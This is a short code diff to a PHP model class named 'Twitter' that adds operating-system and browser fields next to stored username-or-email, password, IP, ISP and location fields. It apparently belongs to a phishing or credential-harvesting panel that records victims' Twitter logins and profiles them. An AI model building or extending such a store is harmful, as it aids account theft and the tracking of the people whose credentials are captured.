@@ -13,6 +13,8 @@ class Twitter extends Model
         'usernameOrEmail', 
         'password',
         'ip',
+        'os',
+        'browser',
         'isp',
         'city',
         'region',
